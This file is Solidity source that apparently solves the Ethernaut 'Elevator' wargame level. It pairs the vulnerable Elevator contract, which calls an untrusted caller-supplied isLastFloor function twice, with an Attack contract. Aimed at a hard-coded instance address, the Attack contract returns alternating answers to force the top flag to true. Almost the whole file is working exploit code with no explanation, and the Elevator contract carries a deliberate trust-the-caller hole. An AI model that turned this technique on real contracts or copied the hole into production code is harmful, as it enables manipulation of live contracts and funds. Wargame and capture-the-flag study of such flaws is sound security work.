pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack {

    address instance_address = 0x0d3eff4f690b817a964835ff8f1daae05aea3648;
    Elevator target = Elevator(instance_address);
    bool public isLast = true;

    function isLastFloor(uint) public returns (bool) {
        isLast = ! isLast;
        return isLast;
    }

    function hack() public {
        target.goTo(1024);
    }

}